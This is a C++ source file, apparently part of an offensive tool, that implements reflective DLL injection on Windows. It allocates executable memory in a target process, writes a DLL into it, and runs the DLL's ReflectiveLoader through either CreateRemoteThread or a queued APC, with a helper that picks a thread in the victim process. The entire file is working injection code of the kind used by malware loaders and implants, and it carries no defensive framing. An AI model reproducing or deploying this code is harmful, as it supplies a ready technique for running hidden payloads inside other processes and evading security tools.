// injector.cpp
#include "injector.h"
#include "loader.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

bool InjectReflectiveDLL(HANDLE hProc, BYTE* dllBuf, SIZE_T dllSize, DWORD execMode) {
    if (!hProc || !dllBuf || dllSize == 0) return false;

    // Step 1: Allocate memory in remote process
    LPVOID remoteBase = VirtualAllocEx(hProc, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        std::cerr << "[-] VirtualAllocEx failed." << std::endl;
        return false;
    }

    // Step 2: Write DLL into remote process
    if (!WriteProcessMemory(hProc, remoteBase, dllBuf, dllSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory failed." << std::endl;
        return false;
    }

    // Step 3: Resolve entry point offset (ReflectiveLoader)
    DWORD offset = GetReflectiveLoaderOffset(dllBuf);
    if (!offset) {
        std::cerr << "[-] Failed to resolve ReflectiveLoader offset." << std::endl;
        return false;
    }

    LPTHREAD_START_ROUTINE loader = (LPTHREAD_START_ROUTINE)((BYTE*)remoteBase + offset);

    // Step 4: Execution
    if (execMode == EXEC_METHOD::CreateRemoteThreadExec) {
        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loader, remoteBase, 0, NULL);
        if (!hThread) {
            std::cerr << "[-] CreateRemoteThread failed." << std::endl;
            return false;
        }
        CloseHandle(hThread);
        std::cout << "[+] DLL injected via CreateRemoteThread." << std::endl;
    }
    else if (execMode == EXEC_METHOD::ApcExec) {
        DWORD tid = FindSuitableThread(GetProcessId(hProc));
        if (tid == 0) {
            std::cerr << "[-] No suitable thread found for APC." << std::endl;
            return false;
        }

        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (!hThread) {
            std::cerr << "[-] Failed to open thread for APC." << std::endl;
            return false;
        }

        QueueUserAPC((PAPCFUNC)loader, hThread, (ULONG_PTR)remoteBase);
        CloseHandle(hThread);
        std::cout << "[+] DLL injected via APC." << std::endl;
    }

    return true;
}

// Utility: find a thread ID in target process (basic)
DWORD FindSuitableThread(DWORD pid) {
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD threadId = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    return threadId;
}
